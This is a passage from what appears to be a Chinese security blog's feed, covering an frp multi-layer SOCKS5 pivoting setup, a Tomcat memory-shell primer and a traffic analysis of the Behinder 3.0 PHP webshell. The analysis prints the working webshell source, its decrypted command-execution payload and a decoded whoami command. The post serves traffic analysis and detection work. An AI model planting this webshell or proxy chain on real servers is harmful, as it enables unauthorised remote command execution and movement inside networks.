!q@w#e$r#加入token值进行认证</span><br><span class="line"></span><br><span class="line">[plugin_socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6010#新建socks5代理端口</span><br><span class="line">plugin = socks5</span><br><span class="line">plugin_user = admin#socks5代理账号</span><br><span class="line">plugin_passwd = admin#socks5代理密码</span><br></pre></td></tr></table></figure></p><p>运行  <strong>frpc -c frpc.ini</strong>，成功配置连接会有如下提示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2021/08/07 11:47:23 [I] [service.go:282] [f6c32677441abc76] login to server succ</span><br><span class="line">ess, get run id [f6c32677441abc76], server udp port [0]</span><br><span class="line">2021/08/07 11:47:23 [I] [proxy_manager.go:144] [f6c32677441abc76] proxy added: [</span><br><span class="line">plugin_socks5]</span><br><span class="line">2021/08/07 11:47:23 [I] [control.go:179] [f6c32677441abc76] [plugin_socks5] star</span><br><span class="line">t proxy success</span><br></pre></td></tr></table></figure></p><p>我们可以使用proxifier进行测试</p><p><img src="/2021/08/07/Multi-Frp/42.png" alt></p><p>同样后续在其他内网机器上配置，frps.ini无需改动，frpc.ini的ip修改成上一层的ip地址就行。</p><p>最终效果如下：<br><img src="/2021/08/07/Multi-Frp/3.png" alt></p><p>proxychain如下：<br><img src="/2021/08/07/Multi-Frp/6666.png" alt><br>从外层到内层依次排序</p><p>无论是几层代理，按照这个思路去弄就行了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;frp作为常用的流量代理工具，在对于内网渗透过程中需要进行多层流量代理依然很方便，没有想象中的那么复杂。&lt;/p&gt;
&lt;p&gt;Github地址：&lt;a href=&quot;https://github.com/fatedier/frp&quot; target=&quot;_blank&quot; rel=&quot;noope
      
    
    </summary>
    
    
    
      <category term="frp" scheme="http://sherlocz.github.io/tags/frp/"/>
    
  </entry>
  
  <entry>
    <title>内存马</title>
    <link href="http://sherlocz.github.io/2021/06/24/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://sherlocz.github.io/2021/06/24/内存马/</id>
    <published>2021-06-24T03:16:46.000Z</published>
    <updated>2021-06-24T03:42:43.191Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcat中内存马的分类：<br>Listener型内存马<br>Filter型内存马<br>Servlet型内存马</p><p>优先级：listeners-&gt;filters-&gt;servlets</p><p>Sevlet主要的作用是可以动态的生成Web页面，他执行在客户端请求和服务器响应之间</p><p>Filter是一段可以复用的代码，用来拦截HTTP请求、响应、进行一些处理和转换</p><p>Servlet和Filter初始化后会在内存中长期驻留，所以我们只要将其注入到内存中就可以一直生效，直到容器销毁，这就是内存马的实现基础。</p><p>Filter和Servlet的上下文全部存放在ServletContent中，所以需要先获取到ServletContext实例</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Tomcat中内存马的分类：&lt;br&gt;Listener型内存马&lt;br&gt;Filter型内存马&lt;br&gt;Servlet型内存马&lt;/p&gt;
&lt;p&gt;优先级：listeners-&amp;gt;filters-&amp;gt;servlets&lt;/p&gt;
&lt;p&gt;Sevlet主要的作用是可以动态的生成Web页面
      
    
    </summary>
    
    
    
      <category term="Java" scheme="http://sherlocz.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>AntSword-analysis-php</title>
    <link href="http://sherlocz.github.io/2021/06/24/AntSword-analysis-php/"/>
    <id>http://sherlocz.github.io/2021/06/24/AntSword-analysis-php/</id>
    <published>2021-06-24T01:50:01.000Z</published>
    <updated>2021-06-24T01:50:01.311Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>behinder3.0流量分析(PHP)</title>
    <link href="http://sherlocz.github.io/2021/06/23/behinder3-analysis-php/"/>
    <id>http://sherlocz.github.io/2021/06/23/behinder3-analysis-php/</id>
    <published>2021-06-23T07:27:30.000Z</published>
    <updated>2021-06-23T08:50:50.583Z</updated>
    
    <content type="html"><![CDATA[<p>冰蝎为一款主流Webshell管理工具，本篇分析Benhinder3.0中php shell流量。</p><p>Github:<a href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip" target="_blank" rel="noopener">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip</a></p><p>测试环境：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Win7</span><br><span class="line">PhpStudy</span><br><span class="line">Behinder3.0</span><br></pre></td></tr></table></figure></p><p>为了方便测试，php需开启openssl插件。<br><img src="/2021/06/23/behinder3-analysis-php/openssl.png" alt></p><p>Behinder内置Webshell，在server目录下</p><p>shell.php内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class="line">$_SESSION[&apos;k&apos;]=$key;</span><br><span class="line">session_write_close();</span><br><span class="line">$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">     $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">&#125;</span><br><span class="line">    $arr=explode(&apos;|&apos;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>和Behinder2.0相比，可以发现加密方式并没有改变，若开启了openssl，则会采用AES128-&gt;base64进行解密，若未开启openssl，则会使用base64-&gt;异或进行解密。</p><p>将/server/shell.php放置在phpstudy网站目录中，使用Behinder3.0进行连接，默认密码为<strong>rebeyond</strong></p><p>成功连接<br><img src="/2021/06/23/behinder3-analysis-php/success.png" alt></p><h1 id="流量解密"><a href="#流量解密" class="headerlink" title="流量解密"></a>流量解密</h1><p>这里为了直观我将流量代理至burp进行分析，打开webshell之后，bp一共抓到了两个数据包第一个数据包是用来判断连通性，第二个数据包收集了一些系统的基本信息，同Behinder2.0相比，3.0取消了两次获取秘钥的操作，直接将秘钥规定成了md5(“pass”)[0:16]。<br><img src="/2021/06/23/behinder3-analysis-php/2.png" alt></p><p>AES解密：<a href="http://tools.bugscaner.com/cryptoaes/" target="_blank" rel="noopener">http://tools.bugscaner.com/cryptoaes/</a><br>Base64解密：<a href="https://tool.oschina.net/encrypt?type=3" target="_blank" rel="noopener">https://tool.oschina.net/encrypt?type=3</a></p><p>这里在Behinder中通过cmd查询当前用户</p><p>POST数据如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure></p><p>解密后得到php代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function main($cmd,$path)</span><br><span class="line">&#123;</span><br><span class="line">    @set_time_limit(0);</span><br><span class="line">    @ignore_user_abort(1);</span><br><span class="line">    @ini_set(&apos;max_execution_time&apos;, 0);</span><br><span class="line">    $result = array();</span><br><span class="line">    $PadtJn = @ini_get(&apos;disable_functions&apos;);</span><br><span class="line">    if (! empty($PadtJn)) &#123;</span><br><span class="line">        $PadtJn = preg_replace(&apos;/[, ]+/&apos;, &apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = explode(&apos;,&apos;, $PadtJn);</span><br><span class="line">        $PadtJn = array_map(&apos;trim&apos;, $PadtJn);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $PadtJn = array();</span><br><span class="line">    &#125;</span><br><span class="line">    $c = $cmd;</span><br><span class="line">    if (FALSE !== strpos(strtolower(PHP_OS), &apos;win&apos;)) &#123;</span><br><span class="line">        $c = $c . &quot; 2&gt;&amp;1\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $JueQDBH = &apos;is_callable&apos;;</span><br><span class="line">    $Bvce = &apos;in_array&apos;;</span><br><span class="line">    if ($JueQDBH(&apos;system&apos;) and ! $Bvce(&apos;system&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        system($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;proc_open&apos;) and ! $Bvce(&apos;proc_open&apos;, $PadtJn)) &#123;</span><br><span class="line">        $handle = proc_open($c, array(</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;r&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            ),</span><br><span class="line">            array(</span><br><span class="line">                &apos;pipe&apos;,</span><br><span class="line">                &apos;w&apos;</span><br><span class="line">            )</span><br><span class="line">        ), $pipes);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        while (! feof($pipes[1])) &#123;</span><br><span class="line">            $kWJW .= fread($pipes[1], 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        @proc_close($handle);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;passthru&apos;) and ! $Bvce(&apos;passthru&apos;, $PadtJn)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        passthru($c);</span><br><span class="line">        $kWJW = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;shell_exec&apos;) and ! $Bvce(&apos;shell_exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = shell_exec($c);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;exec&apos;, $PadtJn)) &#123;</span><br><span class="line">        $kWJW = array();</span><br><span class="line">        exec($c, $kWJW);</span><br><span class="line">        $kWJW = join(chr(10), $kWJW) . chr(10);</span><br><span class="line">    &#125; else if ($JueQDBH(&apos;exec&apos;) and ! $Bvce(&apos;popen&apos;, $PadtJn)) &#123;</span><br><span class="line">        $fp = popen($c, &apos;r&apos;);</span><br><span class="line">        $kWJW = NULL;</span><br><span class="line">        if (is_resource($fp)) &#123;</span><br><span class="line">            while (! feof($fp)) &#123;</span><br><span class="line">                $kWJW .= fread($fp, 1024);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose($fp);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $kWJW = 0;</span><br><span class="line">        $result[&quot;status&quot;] = base64_encode(&quot;fail&quot;);</span><br><span class="line">        $result[&quot;msg&quot;] = base64_encode(&quot;none of proc_open/passthru/shell_exec/exec/exec is available&quot;);</span><br><span class="line">        $key = $_SESSION[&apos;k&apos;];</span><br><span class="line">        echo encrypt(json_encode($result), $key);</span><br><span class="line">        return;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode(getSafeStr($kWJW));</span><br><span class="line">    echo encrypt(json_encode($result),  $_SESSION[&apos;k&apos;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">    for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">     $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    &#125;</span><br><span class="line">return $data;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">    return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;$cmd=&quot;Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXV1wiJndob2FtaQ==&quot;;$cmd=base64_decode($cmd);$path=&quot;QzovcGhwU3R1ZHkvUEhQVHV0b3JpYWwvV1dXLw==&quot;;$path=base64_decode($path);</span><br><span class="line">main($cmd,$path);</span><br></pre></td></tr></table></figure></p><p>其中cmdbase64再次解密后为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /d &quot;C:\phpStudy\PHPTutorial\WWW\&quot;&amp;whoami</span><br></pre></td></tr></table></figure></p><p>可以看见执行了我们想要的系统命令，再来看返回包的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原始返回数据：</span><br><span class="line">mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j6s/lQ/FSv4i/f1oXtFnU8jMC7rtIEWFK+lwkXIolWSPw==</span><br><span class="line">AES解密后数据：</span><br><span class="line">&#123;&quot;status&quot;:&quot;c3VjY2Vzcw==&quot;,&quot;msg&quot;:&quot;c3dhZzctcGNcc3dhZzcNCg==&quot;&#125;</span><br><span class="line">base64解密后的msg：</span><br><span class="line">swag7-pc\swag7</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;冰蝎为一款主流Webshell管理工具，本篇分析Benhinder3.0中php shell流量。&lt;/p&gt;
&lt;p&gt;Github:&lt;a href=&quot;https://github.com/rebeyond/Behinder/releases/download/Behinder_
      
    
    </summary>
    
    
    
      <category term="webshell" scheme="http://sherlocz.github.io/tags/webshell/"/>
    
      <category term="流量分析" scheme="http://sherlocz.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>behinder2.0流量分析(PHP)</title>
    <link href="http://sherlocz.github.io/2021/06/23/behinder2-analysis/"/>
    <id>http://sherlocz.github.io/2021/06/23/behinder2-analysis/</id>
    <published>2021-06-23T02:02:45.000Z</published>
    <updated>2021-06-23T08:35:00.334Z</updated>
    
